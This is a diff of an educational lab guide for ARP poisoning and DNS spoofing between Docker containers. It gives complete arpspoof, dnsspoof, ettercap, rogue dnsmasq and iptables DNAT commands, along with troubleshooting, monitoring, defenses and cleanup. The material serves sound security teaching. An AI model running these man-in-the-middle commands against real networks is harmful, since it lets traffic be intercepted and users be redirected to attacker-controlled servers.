-# Start ARP poisoning in background
-sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4 &
-sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30 &
-
-# Start DNS spoofing
-sudo dnsspoof -i eth0 -f /tmp/dns_hosts host 192.168.1.30
-```
-
-<div class="step-animation success">
-<strong>Step 3:</strong> Monitor Attack Implementation
-</div>
-
-```bash
-# Real-time monitoring of DNS spoofing
-sudo tcpdump -i eth0 -n -s 0 port 53 and host 192.168.1.30
-
-# Monitor HTTP redirection to evil server
-sudo tcpdump -i eth0 -n port 80 and host 192.168.1.100
-```
-
-#### 2.4 Method 1: Network-based DNS Spoofing from Kali Linux (Primary Method)
-
-<div class="network-diagram attack">
-<h4>Kali Linux DNS Spoofing Attack Flow</h4>
-<div class="device client">Victim Container<br/>192.168.1.30</div>
-<span class="arrow">→</span>
-<div class="packet dns">DNS Query<br/>goodserver.com?</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Kali Linux<br/>192.168.1.20<br/>(MITM)</div>
-<br/><br/>
-<div class="device attacker">Kali Linux<br/>ARP Poisoned</div>
-<span class="arrow attack">→</span>
-<div class="packet spoofed">Fake DNS Reply<br/>goodserver.com = 192.168.1.100</div>
-<span class="arrow attack">→</span>
-<div class="device client">Victim Container</div>
-<br/><br/>
-<div class="device client">Victim connects to</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Evil Server<br/>192.168.1.100</div>
-<span class="arrow">→</span>
-<div class="device attacker">Kali Controlled</div>
-</div>
-
-**Kali Linux DNS Spoofing Explanation:**
-This method demonstrates real-world DNS spoofing using network manipulation from Kali Linux:
-
-**First row** (DNS Interception):
-- **Victim Container**: Ubuntu container making DNS queries for goodserver.com
-- **DNS Query**: Standard DNS lookup that should go to 192.168.1.4
-- **Kali Linux (MITM)**: Intercepts query due to ARP poisoning positioning
-
-**Second row** (Malicious Response):
-- **Kali Linux**: Responds with spoofed DNS reply instead of forwarding to legitimate DNS
-- **Fake DNS Reply**: Returns evil server IP (192.168.1.100) instead of legitimate IP (192.168.1.10)
-- **Victim Container**: Receives and trusts the false response
-
-**Third row** (Traffic Redirection):
-- **Victim**: Connects to what it believes is goodserver.com
-- **Evil Server**: Container controlled by attacker receives the redirected traffic
-- **Attack Success**: Kali Linux successfully manipulates container-to-container communication
-
-This method demonstrates how an external attacker can manipulate containerized environments.
-
-#### 2.5 Method 2: Docker Network Manipulation (Alternative Method)
-
-For additional demonstration, you can also show direct Docker network manipulation:
-
-<div class="step-animation">
-<strong>Step 1:</strong> Docker Network Analysis from Kali
-</div>
-
-```bash
-# If Docker is accessible from Kali (same machine or SSH access)
-# Analyze Docker network configuration
-docker network inspect src_internal_network
-
-# View container network settings
-docker inspect src_http_requester_1 | grep -A 10 "NetworkSettings"
-docker inspect src_dns_1 | grep -A 10 "NetworkSettings"
-```
-
-<div class="step-animation">
-<strong>Step 2:</strong> Container DNS Configuration Manipulation
-</div>
-
-```bash
-# Method 2A: Modify container DNS settings (if Docker access available)
-# Stop victim container temporarily
-docker stop src_http_requester_1
-
-# Modify container to use Kali as DNS server (advanced)
-# This requires container recreation with new DNS settings
-
-# Method 2B: Network namespace manipulation
-sudo ip netns list
-sudo ip netns exec container_namespace iptables -t nat -A OUTPUT -p tcp --dport 53 -j DNAT --to-destination 192.168.1.20:53
-```
-
-<div class="step-animation">
-<strong>Step 3:</strong> Hybrid Attack - DNS Server + Network Manipulation
-</div>
-
-```bash
-# Run a rogue DNS server on Kali Linux
-# Install and configure dnsmasq on Kali
-sudo apt install dnsmasq
-
-# Configure rogue DNS server
-cat << EOF | sudo tee /etc/dnsmasq.d/attack.conf
-# Listen on Kali interface
-interface=eth0
-bind-interfaces
-listen-address=192.168.1.20
-
-# Spoofed entries
-address=/goodserver.com/192.168.1.100
-address=/evilserver.com/192.168.1.100
-
-# Forward other queries to legitimate DNS
-server=8.8.8.8
+# Create ettercap DNS configuration file
+cat > /tmp/etter.dns << EOF
+# DNS spoofing configuration
+goodserver.com      A   192.168.1.100
+www.goodserver.com  A   192.168.1.100
+*.goodserver.com    A   192.168.1.100
 EOF
 
-# Start rogue DNS server
-sudo systemctl restart dnsmasq
-
-# Use ARP poisoning to redirect DNS queries to Kali
-sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//
+# Copy to ettercap directory
+cp /tmp/etter.dns /etc/ettercap/etter.dns
 ```
 
-<div class="interactive-demo">
-<h4>Attack Method Comparison</h4>
-<div class="code-highlight">
-<strong>Network Method:</strong> ARP poisoning + DNS interception (Primary)<br/>
-<strong>Docker Method:</strong> Container manipulation + network redirection<br/>
-<strong>Hybrid Method:</strong> Rogue DNS server + network positioning<br/>
-<strong>Stealth Level:</strong> Network (High) vs Docker (Medium) vs Hybrid (Low)<br/>
-<strong>Persistence:</strong> Network (Temporary) vs Docker (Persistent) vs Hybrid (Configurable)
-</div>
-</div>
+#### Step 4.2: Manual DNS Spoofing with ettercap
 
-### 3. Monitoring and Verification from Kali Linux
-
-#### 3.1 Real-time Attack Monitoring
-
-<div class="step-animation">
-<strong>Step 1:</strong> Monitor Attack Traffic from Kali Linux
-</div>
+While ARP spoofing is running, start DNS spoofing:
 
 ```bash
-# Terminal 1: Monitor all DNS traffic on network
-sudo tcpdump -i eth0 -n -s 0 port 53
+# Stop previous arpspoof if running
+killall arpspoof
 
-# Terminal 2: Monitor HTTP traffic redirection
-sudo tcpdump -i eth0 -n port 80 and \(host 192.168.1.30 or host 192.168.1.100\)
+# Start ettercap with both ARP and DNS spoofing
+ettercap -T -i eth0 -M arp:remote /$VICTIM_IP// /$DNS_SERVER// -P dns_spoof
 
-# Terminal 3: Monitor ARP poisoning effectiveness
-sudo tcpdump -i eth0 -n arp
-
-# Terminal 4: Check victim container logs (if Docker access available)
-# docker logs -f src_http_requester_1
+# Replace variables with actual IPs:
+ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4// -P dns_spoof
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Verify Attack Success from Kali Linux
-</div>
+#### Step 4.3: Verify DNS Spoofing Success
 
-After implementing the DNS spoofing attack, verify success:
-
-<div class="interactive-demo">
-<h4>Expected Attack Indicators</h4>
-<div class="code-highlight">
-<strong>ARP Tables:</strong> Victim container shows Kali MAC for DNS server IP<br/>
-<strong>DNS Queries:</strong> All victim DNS queries pass through Kali Linux<br/>
-<strong>HTTP Traffic:</strong> Victim connects to 192.168.1.100 instead of 192.168.1.10<br/>
-<strong>Response Change:</strong> "Hello from the GET method!" → "Evil GET greetings!"
-</div>
-</div>
-
-#### 3.2 Detailed Verification Commands from Kali Linux
-
-<div class="step-animation">
-<strong>Step 1:</strong> Verify DNS Spoofing Success
-</div>
+Test if DNS queries are being intercepted and modified:
 
 ```bash
-# Test DNS resolution from Kali Linux perspective
-nslookup goodserver.com 192.168.1.4
+# From victim container
+docker-compose exec http_requester nslookup goodserver.com
 
-# Use dig for detailed DNS analysis
-dig @192.168.1.4 goodserver.com
-
-# Test if victim is using spoofed DNS
-# Monitor network traffic while victim makes requests
-sudo tcpdump -i eth0 -n -s 0 'port 53 and host 192.168.1.30'
+# Should now return 192.168.1.100 (malicious server) instead of 192.168.1.10
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Network Traffic Analysis from Kali
-</div>
+### Phase 5: Attack Verification and Traffic Analysis
+
+#### Step 5.1: Monitor Intercepted Traffic
+
+Capture and analyze the attack traffic:
 
 ```bash
-# Capture and analyze victim's DNS queries
-sudo tcpdump -i eth0 -n -w /tmp/dns_capture.pcap port 53 and host 192.168.1.30
+# Start packet capture
+tcpdump -i eth0 -w /tmp/attack_capture.pcap &
 
-# Analyze captured traffic with tshark
-tshark -r /tmp/dns_capture.pcap -T fields -e ip.src -e ip.dst -e dns.qry.name -e dns.resp.addr
-
-# Monitor HTTP redirection in real-time
-sudo tcpdump -i eth0 -n -A port 80 and host 192.168.1.30
+# Monitor specific types of traffic
+tcpdump -i eth0 port 53                 # DNS traffic
+tcpdump -i eth0 port 80                 # HTTP traffic
+tcpdump -i eth0 arp                     # ARP traffic
 ```
 
-<div class="step-animation">
-<strong>Step 3:</strong> Attack Impact Assessment
-</div>
+#### Step 5.2: Test Complete Attack Chain
+
+From the victim, test the complete attack:
 
 ```bash
-# Verify ARP poisoning is working
-sudo arp -a | grep "192.168.1"
+# In victim container
+docker-compose exec http_requester sh
 
-# Check if traffic flows through Kali Linux
-sudo netstat -i  # Check interface packet counts
+# Test DNS resolution
+nslookup goodserver.com
+# Should return 192.168.1.100
 
-# Test direct connectivity to both servers from Kali
-curl -s http://192.168.1.10 | jq  # Legitimate server
-curl -s http://192.168.1.100 | jq # Evil server
-
-# Monitor victim's connection attempts
-sudo ss -tuln | grep ":80"
+# Test HTTP request
+curl -H "Host: goodserver.com" http://goodserver.com
+# Should connect to malicious server (192.168.1.100)
 ```
 
-#### 3.3 Advanced Monitoring with Wireshark
+#### Step 5.3: Compare with Legitimate Traffic
 
-<div class="step-animation">
-<strong>Step 1:</strong> Wireshark Traffic Capture
-</div>
+Test legitimate traffic to see the difference:
 
 ```bash
-# Start Wireshark from Kali Linux (GUI)
-sudo wireshark &
+# Direct query to legitimate server
+curl -H "Host: goodserver.com" http://192.168.1.10
 
-# Or use command-line capture
-sudo tshark -i eth0 -f "net 192.168.1.0/24" -w /tmp/lab_capture.pcap
-
-# Real-time monitoring with filters
-sudo tshark -i eth0 -f "port 53 or port 80" -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info
+# Direct query to malicious server
+curl -H "Host: goodserver.com" http://192.168.1.100
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Wireshark Analysis Filters
-</div>
+### Phase 6: Advanced Monitoring and Analysis
 
-Useful Wireshark filters for analyzing the attack:
+#### Step 6.1: Real-time Traffic Monitoring
 
-<div class="interactive-demo">
-<h4>Wireshark Filter Examples</h4>
-<div class="code-highlight">
-<strong>DNS Traffic:</strong> <code>dns && ip.addr == 192.168.1.30</code><br/>
-<strong>ARP Poisoning:</strong> <code>arp && arp.opcode == 2</code><br/>
-<strong>HTTP Redirection:</strong> <code>http && ip.addr == 192.168.1.30</code><br/>
-<strong>Spoofed Responses:</strong> <code>dns.flags.response == 1 && dns.a == 192.168.1.100</code>
-</div>
-</div>
-
-#### 3.4 Container-level Verification (If Docker Access Available)
-
-<div class="step-animation">
-<strong>Step 1:</strong> Verify Attack from Container Perspective
-</div>
+Monitor the attack in real-time:
 
 ```bash
-# If Kali has Docker access, verify from victim container
-# Check victim's ARP table
-docker exec src_http_requester_1 arp -a
+# Watch ARP table changes
+watch -n 1 'arp -a'
 
-# Check victim's DNS resolution
-docker exec src_http_requester_1 nslookup goodserver.com
+# Monitor DNS queries
+tcpdump -i eth0 -n port 53 -A
 
-# Monitor victim's HTTP requests
-docker exec src_http_requester_1 netstat -tn
-
-# Check which server is responding
-docker logs --tail=10 src_web_server_1     # Should show no new traffic
-docker logs --tail=10 src_evil_web_server_1 # Should show redirected traffic
+# Monitor HTTP requests
+tcpdump -i eth0 -n port 80 -A
 ```
 
-#### 3.5 Attack Effectiveness Metrics
+#### Step 6.2: Traffic Analysis with Wireshark
 
-<div class="network-diagram">
-<h4>Successful Kali Linux DNS Spoofing Verification</h4>
-<div class="device client">Victim Container<br/>192.168.1.30</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Kali Linux<br/>192.168.1.20<br/>Intercepting</div>
-<span class="arrow attack">→</span>
-<div class="device server">Spoofed DNS<br/>Response</div>
-<br/><br/>
-<div class="packet spoofed">HTTP Request to goodserver.com</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Evil Container<br/>192.168.1.100</div>
-<span class="arrow">→</span>
-<div class="device attacker">Kali Monitoring</div>
-<br/><br/>
-<div class="device client">Victim receives evil content</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Attack confirmed successful</div>
-</div>
-
-**Attack Effectiveness Assessment:**
-This diagram shows the complete verification of a successful DNS spoofing attack from Kali Linux:
-
-**First row** (Traffic Interception):
-- **Victim Container**: Makes requests believing they're going to legitimate services
-- **Kali Linux**: Successfully intercepting and redirecting all DNS queries
-- **Spoofed DNS Response**: Kali provides malicious DNS responses
-
-**Second row** (Traffic Redirection):
-- **HTTP Request**: Victim makes HTTP request to what it thinks is goodserver.com
-- **Evil Container**: Receives redirected traffic from the victim
-- **Kali Monitoring**: Full visibility and control over the attack flow
-
-**Third row** (Attack Confirmation):
-- **Victim**: Unknowingly receives malicious content from evil server
-- **Attack Success**: Kali Linux successfully manipulates container communications
-
-The key success indicators are complete traffic interception, DNS redirection, and evil server responses.
-
-#### 3.6 Common Issues and Solutions (Kali Linux Environment)
-
-<div class="step-animation warning">
-<strong>Issue 1:</strong> ARP poisoning not working
-<br/><strong>Solution:</strong> <code>sudo sysctl net.ipv4.ip_forward=1</code> and verify network interface
-<br/><strong>Explanation:</strong> IP forwarding must be enabled on Kali Linux to maintain connectivity while performing MITM attacks. Also ensure you're using the correct network interface (eth0, wlan0, etc.).
-</div>
-
-<div class="step-animation warning">
-<strong>Issue 2:</strong> DNS spoofing not taking effect
-<br/><strong>Solution:</strong> Clear victim's DNS cache and verify ettercap configuration
-<br/><strong>Explanation:</strong> Container DNS caches may persist. Use <code>docker exec container_name ip route flush cache</code> or restart the victim container. Check <code>/etc/ettercap/etter.dns</code> syntax.
-</div>
-
-<div class="step-animation warning">
-<strong>Issue 3:</strong> Cannot reach containers from Kali Linux
-<br/><strong>Solution:</strong> Verify macvlan network configuration and routing
-<br/><strong>Explanation:</strong> The macvlan Docker network must be accessible from Kali Linux. Check with <code>ip route</code> and ensure the 192.168.1.0/24 network is reachable.
-</div>
-
-<div class="step-animation warning">
-<strong>Issue 4:</strong> Ettercap privilege errors
-<br/><strong>Solution:</strong> Run with <code>sudo</code> and check ettercap configuration
-<br/><strong>Explanation:</strong> Network attacks require root privileges. Edit <code>/etc/ettercap/etter.conf</code> to set ec_uid = 0 and ec_gid = 0 if needed.
-</div>
-
-<div class="step-animation warning">
-<strong>Issue 5:</strong> Traffic not being intercepted
-<br/><strong>Solution:</strong> Verify ARP tables and use promiscuous mode
-<br/><strong>Explanation:</strong> Check victim's ARP table with <code>arp -a</code>. Enable promiscuous mode: <code>sudo ip link set eth0 promisc on</code>
-</div>
-
-### 4. Advanced Analysis and Learning Objectives
-
-#### 4.1 Understanding Real-world Attack Vectors
-
-<div class="interactive-demo">
-<h4>Kali Linux DNS Spoofing Attack Vectors</h4>
-<div class="code-highlight">
-<strong>Vector 1:</strong> Network-based ARP poisoning + DNS interception<br/>
-<strong>Vector 2:</strong> Rogue DNS server with traffic redirection<br/>
-<strong>Vector 3:</strong> Container network manipulation<br/>
-<strong>Impact:</strong> Complete control over victim's DNS resolution
-</div>
-</div>
-
-**Real-world Attack Vector Analysis:**
-This lab demonstrates practical DNS spoofing techniques that mirror real-world scenarios:
-
-1. **Network-based Attacks**: Using ARP poisoning to position Kali Linux as a man-in-the-middle, intercepting DNS queries before they reach legitimate servers.
-
-2. **Rogue Infrastructure**: Setting up malicious DNS servers that respond with false information, simulating compromised network infrastructure.
-
-3. **Container Security**: Demonstrating how containerized applications are vulnerable to network-level attacks, even when using isolated Docker networks.
-
-#### 4.2 Kali Linux Attack Methodology
-
-<div class="step-animation">
-<strong>Learning Objective 1:</strong> Master Network Attack Tools
-</div>
-
-Key skills developed through this lab:
-- **ettercap**: Advanced man-in-the-middle attack framework
-- **arpspoof**: Targeted ARP poisoning for traffic redirection  
-- **dnsspoof**: DNS response manipulation and interception
-- **tcpdump/Wireshark**: Network traffic analysis and monitoring
-- **nmap**: Network reconnaissance and service discovery
-
-<div class="step-animation">
-<strong>Learning Objective 2:</strong> Container Network Security
-</div>
-
-Understanding container vulnerabilities:
-- **macvlan networks**: How Docker bridges expose containers to network attacks
-- **DNS dependencies**: Container reliance on external DNS services
-- **Network isolation**: Limitations of container network security
-- **Attack surface**: How external attackers can manipulate container communications
-
-#### 4.3 Defense Against Kali Linux-based Attacks
-
-<div class="interactive-demo">
-<h4>Defensive Measures Against Network Attacks</h4>
-<div class="code-highlight">
-<strong>Network Level:</strong> Static ARP entries, port security, network segmentation<br/>
-<strong>DNS Level:</strong> DNSSEC, DNS over HTTPS/TLS, multiple DNS providers<br/>
-<strong>Container Level:</strong> Network policies, DNS filtering, monitoring<br/>
-<strong>Detection:</strong> ARP monitoring, DNS query analysis, traffic inspection
-</div>
-</div>
-
-**Defense Strategy Explanation:**
-- **Static ARP entries**: Prevent ARP poisoning by manually configuring MAC-IP mappings
-- **Network segmentation**: Isolate critical services using VLANs or separate networks  
-- **DNS security**: Implement DNSSEC, DoH, or DoT to prevent DNS manipulation
-- **Container policies**: Use Kubernetes network policies or Docker security features
-- **Monitoring systems**: Deploy intrusion detection systems that alert on ARP anomalies
-
-### 5. Laboratory Cleanup and Reset
-
-#### 5.1 Stop Attack and Restore Normal Operation
-
-<div class="timeline">
-<div class="timeline-item">
-<strong>Step 1:</strong> Stop all Kali Linux attack tools
-</div>
-<div class="timeline-item">
-<strong>Step 2:</strong> Clear ARP poisoning from network
-</div>
-<div class="timeline-item">
-<strong>Step 3:</strong> Verify normal container communications
-</div>
-<div class="timeline-item">
-<strong>Step 4:</strong> Document attack findings and cleanup
-</div>
-</div>
-
-**Cleanup Process Explanation:**
-This process ensures the network returns to normal operation and all attack traces are removed.
-
-<div class="step-animation">
-<strong>Step 1:</strong> Stop Attack Tools on Kali Linux
-</div>
+If you want to analyze captured traffic:
 
 ```bash
-# Stop ettercap (Ctrl+C or kill process)
-sudo pkill ettercap
+# Copy capture file to host for analysis
+docker cp $(docker-compose ps -q kali_attacker):/tmp/attack_capture.pcap ./
 
-# Stop arpspoof processes
-sudo pkill arpspoof
-
-# Stop dnsspoof
-sudo pkill dnsspoof
-
-# Stop any rogue DNS server
-sudo systemctl stop dnsmasq
-
-# Restore normal ettercap DNS configuration
-sudo cp /etc/ettercap/etter.dns.backup /etc/ettercap/etter.dns 2>/dev/null || true
+# Or analyze with tshark in container
+tshark -r /tmp/attack_capture.pcap -Y "dns or arp or http"
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Clear Network Poisoning
-</div>
+### Phase 7: Attack Cleanup and Restoration
+
+#### Step 7.1: Stop Attacks
+
+Properly stop all attack processes:
 
 ```bash
-# Clear ARP cache on Kali Linux
-sudo ip -s -s neigh flush all
+# Stop ettercap
+killall ettercap
 
-# Send gratuitous ARP to restore correct mappings
-sudo arping -c 5 -I eth0 192.168.1.4
-sudo arping -c 5 -I eth0 192.168.1.30
+# Stop arpspoof if running separately
+killall arpspoof
 
-# Disable IP forwarding if no longer needed
-sudo sysctl net.ipv4.ip_forward=0
-
-# Restore normal network interface settings
-sudo ip link set eth0 promisc off
+# Stop tcpdump
+killall tcpdump
 ```
 
-<div class="step-animation">
-<strong>Step 3:</strong> Verify Normal Container Operation
-</div>
+#### Step 7.2: Restore Normal Network State
 
 ```bash
-# Test DNS resolution is restored
-nslookup goodserver.com 192.168.1.4
+# Clear ARP caches (if possible)
+# From victim container:
+docker-compose exec http_requester ip neigh flush all
 
-# Should return 192.168.1.10 (legitimate server)
-
-# Monitor container traffic to ensure normal operation
-sudo tcpdump -i eth0 -n -c 10 port 80 and host 192.168.1.30
-
-# Verify containers are communicating normally
-# docker logs --tail=20 src_http_requester_1  # (if Docker access available)
+# Verify DNS resolution is back to normal
+docker-compose exec http_requester nslookup goodserver.com
+# Should return 192.168.1.10 again
 ```
 
-<div class="step-animation">
-<strong>Step 4:</strong> Final Verification and Documentation
-</div>
+## 🔧 Tool-Specific Configurations and Usage
+
+### Ettercap Configuration
+
+#### Basic Ettercap Usage
 
 ```bash
-# Verify no attack tools are running
-ps aux | grep -E "(ettercap|arpspoof|dnsspoof)"
+# Text mode with ARP spoofing
+ettercap -T -i eth0 -M arp:remote /target1// /target2//
 
-# Check network is clean
-sudo arp -a | grep "192.168.1"
+# List available plugins
+ettercap -P list
 
-# Test legitimate server is receiving traffic again
-curl -s http://192.168.1.10 | jq  # Should respond normally
-
-# Document attack timeline and cleanup
-echo "Attack completed at $(date)" >> /tmp/lab_log.txt
-echo "Cleanup completed at $(date)" >> /tmp/lab_log.txt
+# Use specific plugin
+ettercap -T -i eth0 -M arp:remote /victim// /target// -P plugin_name
 ```
 
-## References and Additional Resources
+#### Ettercap DNS Configuration
 
-### Docker and Container Security
-- [Docker Network Security Best Practices](https://docs.docker.com/network/security/)
-- [Container Network Security](https://kubernetes.io/docs/concepts/policy/pod-security-policy/)
-- [Macvlan Network Driver Documentation](https://docs.docker.com/network/macvlan/)
+The DNS spoofing plugin requires a configuration file:
 
-### DNS Security and DNSSEC
-- [OWASP DNS Spoofing](https://owasp.org/www-community/attacks/DNS_Spoofing)
-- [RFC 4033 - DNS Security](https://tools.ietf.org/html/rfc4033)
-- [DNS over HTTPS (DoH) RFC 8484](https://tools.ietf.org/html/rfc8484)
-- [DNS over TLS (DoT) RFC 7858](https://tools.ietf.org/html/rfc7858)
+```bash
+# Location: /etc/ettercap/etter.dns
+# Format:
+domain.com    A    IP_ADDRESS
+*.domain.com  A    IP_ADDRESS
+domain.com    AAAA ::1           # IPv6 redirect to localhost
+```
 
-### Network Security Tools and Techniques
-- [dnsmasq Documentation](http://www.thekelleys.org.uk/dnsmasq/doc.html)
-- [Ettercap Documentation](https://ettercap.github.io/ettercap/)
-- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
-- [ARP Protocol RFC 826](https://tools.ietf.org/html/rfc826)
+### Dsniff Tools Configuration
 
-### Laboratory Environment Extensions
-- [Docker Compose Networking](https://docs.docker.com/compose/networking/)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [curl Advanced Usage](https://curl.se/docs/manpage.html)
+#### Arpspoof Usage
 
-### Real-world Case Studies
-- [DNS Hijacking Incidents and Response](https://www.cisa.gov/news-events/alerts/2019/01/24/dns-infrastructure-hijacking-campaign)
-- [BGP and DNS Security](https://www.nist.gov/publications/bgp-and-dns-security)
+```bash
+# Basic syntax
+arpspoof -i interface -t target gateway
+
+# Bidirectional spoofing
+arpspoof -i eth0 -t 192.168.1.30 192.168.1.4 &
+arpspoof -i eth0 -t 192.168.1.4 192.168.1.30 &
+```
+
+#### Dnsspoof Usage
+
+```bash
+# Basic DNS spoofing (requires ARP spoofing first)
+dnsspoof -i eth0 -f /path/to/hosts_file
+
+# Hosts file format:
+# 192.168.1.100 goodserver.com
+# 192.168.1.100 www.goodserver.com
+```
+
+## 🚀 Automated Scripts Usage
+
+After understanding the manual process, you can use the provided automated scripts:
+
+### Quick Start with Scripts
+
+```bash
+# Access attacker container
+docker-compose exec kali_attacker bash
+
+# Use interactive menu
+/scripts/lab1_menu.sh
+
+# Or use individual scripts:
+/scripts/network_recon.sh                                    # Network discovery
+/scripts/arp_spoof.sh 192.168.1.30 192.168.1.4             # ARP spoofing
+/scripts/dns_spoof.sh 192.168.1.30 192.168.1.4 192.168.1.100 goodserver.com  # Combined attack
+/scripts/traffic_capture.sh eth0 180                        # Traffic capture
+/scripts/verify_tools.sh                                    # Tool verification
+```
+
+### What is DNS Spoofing?
+
+!!! note "DNS Spoofing Definition"
+    **DNS Spoofing** es una técnica donde el atacante se posiciona como intermediario (MITM) entre la víctima y el servidor DNS para interceptar y modificar las respuestas DNS, redirigiendo el tráfico hacia servidores maliciosos.
+
+#### Normal DNS flow
+
+```mermaid
+sequenceDiagram
+    participant Client
+    participant DNS_Server
+    participant Web_Server
+    
+    Client->>DNS_Server: What is the IP of goodserver.com?
+    DNS_Server->>Client: goodserver.com = 192.168.1.10
+    Client->>Web_Server: GET / HTTP/1.1 Host: goodserver.com
+```
+
+#### MITM DNS Spoofing flow
+
+```mermaid
+sequenceDiagram
+    participant Client as Victim<br/>192.168.1.30
+    participant Attacker as Attacker<br/>192.168.1.20
+    participant DNS as DNS Server<br/>192.168.1.4
+    participant Legit as Legit Server<br/>192.168.1.10
+    participant Evil as Evil Server<br/>192.168.1.100
+    
+    Note over Attacker: Step 1: ARP Spoofing
+    Attacker->>Client: ARP Reply: DNS Server MAC = Attacker MAC
+    
+    Note over Client: Step 2: DNS Query (intercepted)
+    Client->>Attacker: DNS Query: goodserver.com? (thinks it's DNS server)
+    
+    Note over Attacker: Step 3: DNS Response Modification
+    Attacker->>Client: DNS Response: goodserver.com = 192.168.1.100
+    
+    Note over Client: Step 4: HTTP Request to Evil Server
+    Client->>Evil: GET / HTTP/1.1 Host: goodserver.com
+```
+
+#### DNS Spoofing in action
+
+```mermaid
+sequenceDiagram
+    participant Client as Victim<br/>192.168.1.30
+    participant Attacker as Attacker<br/>192.168.1.20
+    participant DNS_Server as DNS Server<br/>192.168.1.4
+    participant Evil_Server as Evil Server<br/>192.168.1.100
+    
+    Note over Attacker: Intercepting DNS traffic via ARP spoofing
+    Client->>Attacker: What is the IP of goodserver.com? (thinks it's DNS server)
+    Note over Attacker: Does not forward to real DNS server
+    Attacker->>Client: goodserver.com = 192.168.1.100 (malicious IP)
+    Client->>Evil_Server: GET / HTTP/1.1 Host: goodserver.com
+```
+
+## 🐳 Docker Environment Configuration
+
+### Laboratory Architecture
+
+```mermaid
+graph TB
+    subgraph "Docker Network - Bridge"
+        A[Attacker Container<br/>Kali Linux<br/>192.168.1.20]
+        B[Victim Container<br/>HTTP Requester<br/>192.168.1.30]
+        C[Legitimate Server<br/>Web Server<br/>192.168.1.10]
+        D[Malicious Server<br/>Evil Web Server<br/>192.168.1.100]
+        E[DNS Server<br/>DNSMasq<br/>192.168.1.4]
+    end
+    
+    B -->|DNS Query| A
+    A -->|Fake DNS Response| B
+    B -->|HTTP Request| D
+    A -->|ARP Spoofing| E
+    
+    style A fill:#ff6b6b
+    style D fill:#ff6b6b
+    style B fill:#4ecdc4
+    style C fill:#45b7d1
+    style E fill:#96ceb4
+```
+
+### System Requirements
+
+!!! warning "Required Privileges"
+    To perform ARP spoofing in Docker, we need:
+    
+    - Elevated network capabilities (`NET_ADMIN`, `NET_RAW`)
+    - Custom bridge network (not macvlan for this lab)
+    - Containers with specialized network tools
+
+## 🔧 Environment Preparation
+
+### Step 1: Network Configuration
+
+The configuration has been optimized to use **bridge** instead of **macvlan**:
+
+!!! tip "Why Bridge instead of Macvlan?"
+    - **Bridge**: Allows ARP spoofing between containers on the same network
+    - **Macvlan**: Containers get unique MACs, more difficult for internal spoofing
+    - **Bridge** better simulates a traditional LAN network
+
+### Step 2: Attacker Container
+
+The laboratory includes a specialized container:
+
+#### Kali Linux Attacker (192.168.1.20)
+```dockerfile
+FROM kalilinux/kali-rolling
+# Tools: ettercap, dsniff, nmap, tcpdump, python3-scapy
+```
+
+### Step 3: Start the Environment
+
+```bash
+# Build and run all containers
+docker-compose up -d
+
+# Verify all containers are active
+docker-compose ps
+
+# Access the Kali container
+docker-compose exec kali_attacker bash
+```
+
+## 🎯 Attack Execution
+
+### ARP Spoofing
+
+#### Method 1: Using Ettercap (Kali Container)
+
+```bash
+# Access the Kali container
+docker-compose exec kali_attacker bash
+
+# Execute reconnaissance script
+/scripts/network_recon.sh
+
+# View ARP table before attack
+arp -a
+
+# Execute automatic ARP spoofing
+/scripts/arp_spoof.sh 192.168.1.30 192.168.1.1
+
+# Or use the interactive menu
+/scripts/lab1_menu.sh
+```
+
+#### Attack Verification
+
+!!! example "Verify ARP Spoofing"
+    ```bash
+    # In the victim container (requester)
+    docker-compose exec http_requester sh
+    arp -a
+    # Should show the attacker's MAC for the gateway
+    ```
+
+### DNS Spoofing
+
+#### Method 1: ARP Spoofing against the DNS server
+
+The attacker impersonates the DNS server to directly intercept the victim's DNS queries:
+
+```bash
+# En el contenedor Kali
+# Method 1: DNS spoofing script (recommended)
+/scripts/dns_spoof.sh 192.168.1.30 192.168.1.4 192.168.1.100 goodserver.com
+
+# Method 2: Use interactive menu
+/scripts/lab1_menu.sh
+# Seleccionar opción 4 (DNS Spoofing)
+```
+
+!!! info "How the complete MITM works"
+    1. **ARP Spoofing**: The attacker impersonates the DNS server (192.168.1.4) by sending false ARP responses
+    2. **DNS Interception**: The victim sends DNS queries directly to the attacker believing it's the DNS server
+    3. **Malicious Response**: The attacker responds with the malicious server's IP without consulting the real DNS
+    4. **Redirection**: The victim receives the malicious server's IP (192.168.1.100) and connects to it
+
+!!! warning "Important Configuration"
+    The attack works completely within the Docker network:
+    
+    - **ARP spoofing target**: DNS Server (192.168.1.4), not the gateway
+    - **Victim**: HTTP requester container (192.168.1.30)
+    - **Malicious server**: Evil web server (192.168.1.100)
+    - **No external traffic**: Everything remains within Docker's bridge network
+
+### Combined Attacks
+
+!!! warning "Complete MITM Attack - Explanation"
+    In this laboratory, the attack is simplified because it's completely internal:
+    
+    **Single attack: DNS Spoofing with integrated ARP Spoofing**
+    ```bash
+    # The attacker impersonates the DNS server
+    /scripts/dns_spoof.sh 192.168.1.30 192.168.1.4 192.168.1.100 goodserver.com
+    ```
+    
+    **Alternatively, use the interactive menu:**
+    ```bash
+    # Use interactive menu
+    /scripts/lab1_menu.sh
+    # Select option 4 for DNS spoofing
+    ```
+    
+    **Monitoring (Optional):**
+    ```bash
+    # Capture all traffic for analysis
+    /scripts/traffic_capture.sh eth0 300
+    ```
+
+!!! tip "Tool Verification"
+    Before executing attacks, verify that all tools are correctly installed:
+    ```bash
+    /scripts/verify_tools.sh
+    ```
+
+!!! tip "MITM Attack Flow"
+    1. **Victim** (192.168.1.30) needs to resolve `goodserver.com`
+    2. **Attacker** (192.168.1.20) impersonates the DNS server (192.168.1.4) via ARP spoofing
+    3. **DNS Query** goes directly to the attacker instead of the real DNS server
